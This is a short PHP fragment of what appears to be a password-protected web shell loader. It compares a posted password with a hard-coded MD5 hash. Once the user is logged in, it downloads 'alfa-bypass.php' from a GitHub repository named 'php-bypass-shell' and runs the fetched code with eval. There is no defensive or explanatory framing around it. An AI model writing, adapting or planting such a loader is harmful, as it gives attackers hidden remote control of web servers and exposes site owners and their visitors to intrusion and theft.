...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '3cab53773122aeb11b4edb708a53b6cd'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/bandung6etar/php-bypass-shell/main/alfa-bypass.php');
    eval('?>' . $a);
} else {
